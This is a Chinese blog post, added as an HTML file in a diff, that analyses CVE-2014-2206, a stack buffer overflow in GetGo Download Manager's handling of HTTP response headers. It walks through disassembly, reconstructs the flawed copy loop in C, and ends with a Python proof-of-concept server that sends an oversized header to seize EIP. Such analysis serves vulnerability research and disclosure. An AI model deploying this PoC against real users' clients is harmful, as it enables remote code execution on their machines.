@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <title>CVE-2014-2206：远程代码执行漏洞大剖析</title>
+        <meta name="viewport" content="width=device-width">
+
+        <!-- syntax highlighting CSS -->
+        <link rel="stylesheet" href="/css/syntax.css">
+
+        <!-- Custom CSS -->
+        <link rel="stylesheet" href="/css/main.css">
+
+        <link href="/css/prettify.css" rel="stylesheet" type="text/css" media="all">
+
+    </head>
+    <body>
+
+        <div id="header" alog-group="log-header">
+          <div class="header-content">
+                
+                <div id="menu"><a href="/">首页</a></div>
+                <div id="usrbar"><a href="http://news.baidu.com">百度新闻</a>|<a href="http://www.baidu.com">百度首页</a></div>
+                <div class="top-main"><h1 class="title"><a href="/">LubyRuffy的天上人间</a></h1></div>
+          </div>  
+        </div>
+
+        <div class="clearfix" id="body">
+          <div class="l-main-col">
+            
+
+            <div id="page">
+	<h2>CVE-2014-2206：远程代码执行漏洞大剖析</h2>
+	<p class="meta">2014-03-07</p>
+
+	<div class="post">
+	        <p></p>
+<p>前些时候我发布了一篇关于远程代码执行漏洞的<a textvalue="安全公告" data_ue_src="http://seclists.org/fulldisclosure/2014/Mar/18" title="" target="_blank" href="http://seclists.org/fulldisclosure/2014/Mar/18">安全公告</a>，被CVSS评了10分。该漏洞影响所有版本的<a textvalue="GetGo DownloadManager" data_ue_src="http://www.getgosoft.com/" title="" target="_blank" href="http://www.getgosoft.com/">GetGo DownloadManager</a>，因此如果有读者在使用这款软件话，请务必用一款更安全的软件代替，因为GetGo项目已经不再被支持了，但是其再<a textvalue="在cnet.com网站仍然评级依然很高" data_ue_src="http://download.cnet.com/GetGo-Download-Manager/3000-2071_4-10277023.html" title="" target="_blank" href="http://download.cnet.com/GetGo-Download-Manager/3000-2071_4-10277023.html">在cnet.com网站仍然评级依然很高</a>。</p>
+<p>本文简单介绍一下该bug的起因，并在打了全部补丁以及启用了DEP保护的Windows 7 64位系统上进行测试：</p>
+<p>当向一个网站请求下载时，下载器会读取目标页面返回的HTTP响应头的值，并将该返回值保存到一块固定大小为4097字节的临时缓存中，但该尺寸并没有被用来限制拷贝到这块缓存中的输入的大小，只是将输入内容一个字节一个字节地拷贝到临时缓存中，直到遇到“\r\n”为止。因此如果HTTP响应头的大小超过了4097字节，就会被写到这块内存的界限之外了。</p>
+<p>下面我们看一下这款下载器如何处理HTTP下载。</p>
+<p style="text-align:center"><img data-original="/imgs/5f87590130edcf5891d300db6989f233.png!small" src="/imgs/5f87590130edcf5891d300db6989f233.png!small" title="1.png"></p>
+<noscript><img src="/imgs/5f87590130edcf5891d300db6989f233.png!small" title="1.png"></noscript>
+<p style="text-align: center;">图1</p>
+<p>当用户像上图一样请求下载时，调试器跳转到断点0x004A4CF4处，正是包含漏洞的代码部分的入口点：</p>
+<pre class="prettyprint lang-html">004A4CDE   . 8B4D 08        MOV ECX,DWORD PTR SS:[EBP+8]
+004A4CE1   . 51             PUSH ECX                                 ; /Arg3
+004A4CE2   . 68 01100000    PUSH 1001                                ; |Arg2 = 00001001
+004A4CE7   . 8D95 DCEFFFFF  LEA EDX,DWORD PTR SS:[EBP-1024]          ; |
+004A4CED   . 52             PUSH EDX                                 ; |Arg1
+004A4CEE   . 8B8D 9CEFFFFF  MOV ECX,DWORD PTR SS:[EBP-1064]          ; |
+004A4CF4   . E8 77EDFFFF    CALL GetGoDM.004A3A70                    ; \GetGoDM.004A3A70</pre>
+<p>该函数包含三个参数，将其转换为相应的c语言风格的函数调用，如下所示：</p>
+<pre class="prettyprint lang-html">int vuln_func(void *buffer, size_t arg2, int arg3)</pre>
+<p>栈内包含三个参数，参数1位于缓存的0x0430C390处，参数2位于0×00001001处，参数3位于0×00000078处，如图2所示：</p>
+<p style="text-align:center"><img data-original="/imgs/9aa7db5e025703de24edec6bd0360b9d.png!small" src="/imgs/5f87590130edcf5891d300db6989f233.png!small" title="2.png"></p>
+<noscript><img src="/imgs/9aa7db5e025703de24edec6bd0360b9d.png!small" title="2.png"></noscript>
+<p style="text-align: center;">图2</p>
+<p>小提示：本示例中你可以完全忽略参数3，因为该值只是用来表示ws2_32版本的select函数从socket中读取内容时的timeout时间:</p>
+<p style="text-align:center"><img data-original="/imgs/ced18ab3048b6de0cb196537317629e3.png!small" src="/imgs/5f87590130edcf5891d300db6989f233.png!small" title="3.png"></p>
+<noscript><img src="/imgs/ced18ab3048b6de0cb196537317629e3.png!small" title="3.png"></noscript>
+<p style="text-align: center;">图3</p>
+<p><span style="color: rgb(38, 38, 38); font-size: 18px;"><strong>这里发生了什么？</strong></span></p>
+<p>在vuln_func()中，第一组重要的指令集为：</p>
+<pre class="prettyprint lang-html">004A3A9F  |. 8B45 0C        MOV EAX,DWORD PTR SS:[EBP+C]
+004A3AA2  |. 50             PUSH EAX
+004A3AA3  |. 6A 00          PUSH 0
+004A3AA5  |. 8B4D 08        MOV ECX,DWORD PTR SS:[EBP+8]
+004A3AA8  |. 51             PUSH ECX
+004A3AA9  |. E8 F2650400    CALL GetGoDM.004EA0A0</pre>
+<p>位于<span style="color: rgb(38, 38, 38);"><strong>0x004A3AA9</strong></span> 的函数使用的三个参数，正是其被调用时，父函数传进来的三个函数。系统将这3个参数压入栈：</p>
+<pre class="prettyprint lang-html">0430C2E4   0430C390  | arg1
+0430C2E8   00000000  | arg2
+0430C2EC   00001001  | arg3</pre>
+<p>该函数只相当于执行了一个简单的memset函数，因此函数调用如下所示：</p>
+<pre class="prettyprint lang-html">void memset(void *arg1, int arg2, size_t arg3)</pre>
+<p>memset函数的功能很简单，用最多arg3个字节的unsigned char类型的数值（arg2）填充arg1指向的内存中，也就是说，地址0x430C390 指向的缓存空间被4097个0×00填充。<br></p>
+<p>接下来对包含漏洞的代码部分进行分析：</p>
+<p style="text-align:center"><img data-original="/imgs/e40ba6eb5a6b4b0ca06ebb617c9b0e91.png!small" src="/imgs/5f87590130edcf5891d300db6989f233.png!small" title="4.png"></p>
+<noscript><img src="/imgs/e40ba6eb5a6b4b0ca06ebb617c9b0e91.png!small" title="4.png"></noscript>
+<p style="text-align: center;">图4</p>
+<p>这里需要对漏洞的构成做一些详细解释，因此下文将程序的一个循环分成两部分进行说明：</p>
+<p><span style="color: rgb(38, 38, 38);"><strong>Part 1 在HTTP响应头中读取一个字节</strong></span></p>
+<pre class="prettyprint lang-html">004A3AE3  |. 8B45 10        |MOV EAX,DWORD PTR SS:[EBP+10]
+004A3AE6  |. 50             |PUSH EAX                                ; /Arg3
+004A3AE7  |. 6A 01          |PUSH 1                                  ; |Arg2 = 00000001
+004A3AE9  |. 8B4D F0        |MOV ECX,DWORD PTR SS:[EBP-10]           ; |
+004A3AEC  |. 8B55 08        |MOV EDX,DWORD PTR SS:[EBP+8]            ; |
+004A3AEF  |. 8D440A FF      |LEA EAX,DWORD PTR DS:[EDX+ECX-1]        ; |
+004A3AF3  |. 50             |PUSH EAX                                ; |Arg1
+004A3AF4  |. 8B4D D8        |MOV ECX,DWORD PTR SS:[EBP-28]           ; |
+004A3AF7  |. 83C1 0C        |ADD ECX,0C                              ; |
+004A3AFA  |. E8 81A4FFFF    |CALL GetGoDM.0049DF80                   ; \GetGoDM.0049DF80</pre>
+<p>地址<span style="color: rgb(38, 38, 38);"><strong>0x004A3AFA</strong></span> 处的函数调用需要三个参数：</p>
+<pre class="prettyprint lang-html">int read_byte(void *buffer, char *arg2, int arg3)</pre>
+<p>其中第一个参数arg1指向缓存，arg2总是0×00000001，arg3总是0×00000078。该函数从接收到的HTTP响应头中读取一个字节，如果成功，就把读取的值保存到arg1指向的缓存，并返回1。</p>
+<p>结尾处的CMP指令用来判断读取是否成功，如果不成功就在0x004A3B0F处跳出循环。</p>
+<pre class="prettyprint lang-html">004A3AFF  |. 8945 E8        |MOV DWORD PTR SS:[EBP-18],EAX
+004A3B02  |. 837D E8 00     |CMP DWORD PTR SS:[EBP-18],0
+004A3B06  |. 75 09          |JNZ SHORT GetGoDM.004A3B11
+004A3B08  |. C745 EC 000000&gt;|MOV DWORD PTR SS:[EBP-14],0
+004A3B0F  |. EB 49          |JMP SHORT GetGoDM.004A3B5A</pre>
+<p><span style="color: rgb(38, 38, 38);"><strong>Part 2 对比接收的字符串，直到遇到“\r\n”</strong></span></p>
+<p style="text-align:center"><img data-original="/imgs/af2313cbfc5fb96551f9094cb159bd51.png!small" src="/imgs/5f87590130edcf5891d300db6989f233.png!small" title="5.png"></p>
+<noscript><img src="/imgs/af2313cbfc5fb96551f9094cb159bd51.png!small" title="5.png"></noscript>
+<p style="text-align: center;">图5</p>
+<pre class="prettyprint lang-html">004A3B26  |. 6A 00          |PUSH 0                              ; /Arg2 = 00000000
+004A3B28  |. 68 F8D76600    |PUSH GetGoDM.0066D7F8               ; |Arg1 = 0066D7F8 ASCII "
+"
+004A3B2D  |. 8D4D E4        |LEA ECX,DWORD PTR SS:[EBP-1C]       ; |
+004A3B30  |. E8 2B5AF6FF    |CALL GetGoDM.00409560               ; \GetGoDM.00409560</pre>
+<p>地址<span style="color: rgb(38, 38, 38);"><strong>0x004A3B30 </strong></span>处的函数调用包含两个参数——参数1包含一个以“\r\n”结尾字符串，参数2总是0×00000000。同时该函数会从栈中读取已经接收的字节，并与“\r\n”进行比较：</p>
+<pre class="prettyprint lang-html">0040959E  |. 0345 0C        ADD EAX,DWORD PTR SS:[EBP+C]             ; |
+004095A1  |. 50             PUSH EAX                                 ; |Arg1
+004095A2  |. E8 79120A00    CALL GetGoDM.004AA820                    ; \GetGoDM.004AA820</pre>
+<p style="text-align:center"><img data-original="/imgs/cd203f00965116c25b5e07277b201040.png!small" src="/imgs/5f87590130edcf5891d300db6989f233.png!small" title="6.png"></p>
+<noscript><img src="/imgs/cd203f00965116c25b5e07277b201040.png!small" title="6.png"></noscript>
+<p style="text-align: center;">图6</p>
+<p>因此该函数可以构造成如下形式： </p>
+<pre class="prettyprint lang-html">signed int search_teminator(*buffer, "\r\n", 0)</pre>
+<p>如果没有找到“\r\n”，则函数返回-1，并执行以下CMP指令：<br></p>
+<pre class="prettyprint lang-html">004A3B38  |. 837D E0 FF     |CMP DWORD PTR SS:[EBP-20],-1
+004A3B3C  |. 74 11          |JE SHORT GetGoDM.004A3B4F</pre>
+<p>即函数search_teminator()的返回值与-1比较，就是说如果JMP指令被执行了，表示以下指令也被程序执行了，包括利用JMP指令跳回到这段代码的开始部分：</p>
+<pre class="prettyprint lang-html">004A3B4F  |&gt; 8B55 F0        |MOV EDX,DWORD PTR SS:[EBP-10]
+004A3B52  |. 83C2 01        |ADD EDX,1
+004A3B55  |. 8955 F0        |MOV DWORD PTR SS:[EBP-10],EDX
+004A3B58  |.^EB 80          \JMP SHORT GetGoDM.004A3ADA</pre>
+<p>但是如果函数search_terminator()找到“\r\n”，会返回字符串的位置，CMP指令就会返回错误，以下指令就会被执行，并跳出循环：</p>
+<pre class="prettyprint lang-html">004A3B3E  |. 8B45 08        |MOV EAX,DWORD PTR SS:[EBP+8]
+004A3B41  |. 0345 E0        |ADD EAX,DWORD PTR SS:[EBP-20]
+004A3B44  |. C600 00        |MOV BYTE PTR DS:[EAX],0
+004A3B47  |. 8B4D E0        |MOV ECX,DWORD PTR SS:[EBP-20]
+004A3B4A  |. 894D EC        |MOV DWORD PTR SS:[EBP-14],ECX
+004A3B4D  |. EB 0B          |JMP SHORT GetGoDM.004A3B5A</pre>
+<p><span style="color: rgb(38, 38, 38); font-size: 18px;"><strong>逆向工程</strong></span></p>
+<p>通过以上分析，可以将包含漏洞的代码转换为类似如下的C代码片段：</p>
+<pre class="prettyprint lang-cpp">int vuln_func(void *buffer, size_t arg2, int arg3)
+{
+  int a;
+  signed int b;
+ 
+  memset(void *buffer, 0, arg2);
+ 
+  while (1)
+  {
+    a = read_byte(*buffer, 1 , arg3)
+    if ( !a )
+    {
+      goto fail;
+    }
+ 
+    b = search_terminator(*buffer, "\r\n", 0)
+    if ( b != -1 )
+      break;
+  }
+ 
+fail:
+  return 0;
+}</pre>
+<p>看出其中的问题了吗？表示大小的参数(arg2)被memset函数用来准备内存空间，但while循环中会读取响应头中的所有字节，直到找到“\r\n”为止，完全忽略了arg2。那么，如果攻击者可以构造出多于4097个字节的HTTP响应头，就会导致写入的缓存超过内存的边界，也就构成了基于栈的缓冲区溢出条件，导致远程代码执行。</p>
+<p style="margin-top: 15px;"><span style="color: rgb(38, 38, 38); font-size: 18px;"><strong>构造PoC</strong></span></p>
+<p>以下PoC代码创建了一个简单的web服务器，用来响应超出预期大小的HTTP头：</p>
+<pre class="prettyprint lang-cpp">from socket import *
+from time import sleep
+ 
+host = "192.168.0.1"
+port = 80
+ 
+s = socket(AF_INET, SOCK_STREAM)
+s.bind((host, port))
+s.listen(1)
+print "\n[+] Listening on %d ..." % port
+ 
+cl, addr = s.accept()
+print "[+] Connection accepted from %s" % addr[0]
+ 
+payload = "\xCC" * 9000
+ 
+buffer = "HTTP/1.1 200 "+payload+"\r\n"
+ 
+print cl.recv(1000)
+cl.send(buffer)
+print "[+] Sending buffer: OK\n"
+ 
+sleep(1)
+cl.close()
+s.close()</pre>
+<p>控制了EIP，就可以随心所欲XXOO了。是不是很爽:-)!</p>
+<p style="text-align:center"><img data-original="/imgs/7f11a2fa884b128c00d86478eb25bd41.png!small" src="/imgs/5f87590130edcf5891d300db6989f233.png!small" title="7.png"></p>
+<noscript><img src="/imgs/7f11a2fa884b128c00d86478eb25bd41.png!small" title="7.png"></noscript>
+<p style="text-align: center;">图7</p>
+<p>[via <a href="http://www.rcesecurity.com/2014/03/cve-2014-2206-getgo-download-manager-http-response-header-buffer-overflow-remote-code-execution/">rcesecurity</a>]<br></p>
+
+        <p class="statement">
+
+	</div>
+</div>
+
+
+          </div>
+
+          <div class="l-right-col">
+          </div>
+        </div>
+
+        <div id="footer" alog-group="log-footer">
+          <p class="site-info">
+            <a href="https://github.com/LubyRuffy">github.com/LubyRuffy</a><br />
+            <a href="https://twitter.com/LubyRuffy">twitter.com/LubyRuffy</a><br />
+          </p>
+        </div>
+
+    </body>
+</html>
